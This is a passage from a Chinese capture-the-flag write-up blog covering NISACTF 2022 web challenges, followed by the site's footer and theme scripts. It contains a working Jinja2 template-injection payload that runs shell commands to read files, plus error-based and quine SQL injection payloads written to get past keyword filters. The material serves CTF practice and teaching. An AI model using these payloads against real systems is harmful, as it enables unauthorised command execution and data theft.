rc4_main(<span class="hljs-string">"HereIsTreasure"</span>,<span class="hljs-string">"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag.txt').read()\")}}{% endif %}{% endfor %}"</span>)
<span class="hljs-comment"># rc4_main("HereIsTreasure","{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /proc/self/cgroup').read()}}")</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157091.png" alt="image-20240719195244852"></p>
<h2 id="join-us">join-us</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157092.png" alt="image-20240719212046082"></p>
<p>注入点就是登录框，抓包后尝试添加单引号发现抱错，说明存在sql注入了</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>'#回显与<span class="hljs-number">1</span>相同，说明是单引号闭合</code></pre>
<p>由于fuzz了一波，发现and、union、database给ban了。尝试找一个不存在的表名，如下图得到数据库名字</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157094.png" alt="image-20240719211903839"></p>
<p>接下来就好办了</p>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(table_name)from information_schema<span class="hljs-selector-class">.tables</span> where table_schema like 'sqlsql')))#</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157095.png" alt="image-20240719212336980"></p>
<p>接下来就是找column列名了，但是column被ban了，能找到join无列名注入</p>
<pre><code class="hljs scss">原理是用 join 连接两张表时, 遇到重复的列名会报错, 并把这个报错的列名显示出来</code></pre>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select * from (select * from output a join output b)c)))#</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157096.png" alt="image-20240719212902902"></p>
<p>找到data列名，接下来输出内容</p>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select data from output)))#
<span class="hljs-comment">//在此只有一个列名的情况下，直接查sqlsql.output也可</span></code></pre>
<p>同时由于回显不全，得利用截断字符，但只有mid没有被ban</p>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,mid((select * from sqlsql.output),<span class="hljs-number">15</span>)))#

tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,mid(concat(<span class="hljs-number">0</span>x7e,(select * from sqlsql.output)),<span class="hljs-number">20</span>,<span class="hljs-number">30</span>))#</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157097.png" alt="image-20240719213640185"></p>
<pre><code class="hljs scss">NSSCTF{<span class="hljs-number">19</span>d1b58b-c3f0-<span class="hljs-number">4</span>bcc-<span class="hljs-number">8</span>c01-<span class="hljs-number">5392</span>f75122ff}</code></pre>
<h3 id="参考文章">参考文章</h3>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2022/08/mysql-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/#joinusing">MySQL 无列名注入的几种方式</a></p>
<h2 id="hardsql">hardsql</h2>
<pre><code class="hljs scss">password=_POST<span class="hljs-selector-attr">[<span class="hljs-string">'passwd'</span>]</span>;
sql="SELECT passwd FROM users WHERE username= 'bilala' and passwd = 'password';";</code></pre>
<p>题目给出提示如上</p>
<p>尝试抓包进行注入的时候，提示我们用户名只能是bilala，那说明只能给passwd注入了，根据提示能猜到这里是个空表，那我们只能让查询的结果与输入的结果一致才行。</p>
<p>那就能想到quine注入了，参考文章可以看下面这个：</p>
<p><a target="_blank" rel="noopener" href="https://peekaboo.show/loginmaster/">[HDCTF 2023]Login Master 复现</a></p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-built_in">replace</span>(replace('<span class="hljs-number">1</span>"/**/union/**/select/**/replace(replace(".",chr(<span class="hljs-number">34</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),".")#',<span class="hljs-built_in">chr</span>(<span class="hljs-number">34</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),'<span class="hljs-number">1</span>"<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-built_in">replace</span>(replace(".",chr(<span class="hljs-number">34</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),".")#')#</code></pre>
<p>最后就是上面这个payload，只不过原本是char，但被ban了。查询可以知道chr与0x三者等价</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157098.png" alt="image-20240719215006671"></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/14/thm-password-gong-ji/">THM-password攻击</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/12/thm-weaponization/">THM-Weaponization</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xgctf2024"><span class="toc-text">[XGCTF2024]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#codeinject"><span class="toc-text">CodeInject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tpdoor"><span class="toc-text">tpdoor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hubuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="toc-text">[HUBUCTF 2022 新生赛]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#howtogetshell"><span class="toc-text">HowToGetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calculate"><span class="toc-text">Calculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezsql"><span class="toc-text">ezsql</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sdctf-2022"><span class="toc-text">[SDCTF 2022]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#apollo-1337"><span class="toc-text">Apollo 1337</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-up-and-read"><span class="toc-text">CURL Up and Read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jawt-that-down"><span class="toc-text">jawt that down!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lots-of-logs"><span class="toc-text">lots of logs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gullible-by-dovesign"><span class="toc-text">gullible by dovesign</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#humongous-mistake"><span class="toc-text">HuMongous Mistake</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nisactf-2022"><span class="toc-text">[NISACTF 2022]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyssrf"><span class="toc-text">easyssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyupload"><span class="toc-text">babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyserialize"><span class="toc-text">babyserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popchains"><span class="toc-text">popchains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#midlevel"><span class="toc-text">midlevel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-up"><span class="toc-text">level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bingdundun~"><span class="toc-text">bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#middlerce"><span class="toc-text">middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-secret"><span class="toc-text">is secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-us"><span class="toc-text">join-us</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardsql"><span class="toc-text">hardsql</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
